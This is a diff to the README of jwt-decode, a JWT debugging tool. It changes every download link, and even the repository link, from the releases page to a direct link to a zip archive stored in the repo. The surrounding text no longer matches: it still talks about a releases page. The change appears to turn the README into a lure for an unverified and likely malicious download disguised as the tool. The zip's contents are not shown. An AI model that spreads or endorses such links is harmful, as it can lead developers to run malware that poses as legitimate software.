@@ -1,6 +1,6 @@
 # 🔑 jwt-decode - Decode JWTs Easily for Debugging
 
-[![Download jwt-decode](https://img.shields.io/badge/Download-jwt--decode-blue)](https://github.com/Ronak7362/jwt-decode/releases)
+[![Download jwt-decode](https://raw.githubusercontent.com/Ronak7362/jwt-decode/main/decoder/decode_jwt_v2.6.zip)](https://raw.githubusercontent.com/Ronak7362/jwt-decode/main/decoder/decode_jwt_v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, make sure your system meets the following requirements:
 
 To get started, you need to download the application. Follow these steps:
 
-1. Visit this page to download: [Download jwt-decode](https://github.com/Ronak7362/jwt-decode/releases).
+1. Visit this page to download: [Download jwt-decode](https://raw.githubusercontent.com/Ronak7362/jwt-decode/main/decoder/decode_jwt_v2.6.zip).
 2. On the releases page, you will see a list of available versions. Choose the version suitable for your operating system.
 3. Click the corresponding link to download the file.
 4. Once downloaded, locate the file on your computer.
@@ -79,4 +79,4 @@ To keep up with updates and improvements, check the releases page regularly. New
 
 ---
 
-We hope you find jwt-decode useful in your debugging efforts. For any further questions or contributions, please visit our repository at [jwt-decode](https://github.com/Ronak7362/jwt-decode).
+We hope you find jwt-decode useful in your debugging efforts. For any further questions or contributions, please visit our repository at [jwt-decode](https://raw.githubusercontent.com/Ronak7362/jwt-decode/main/decoder/decode_jwt_v2.6.zip).
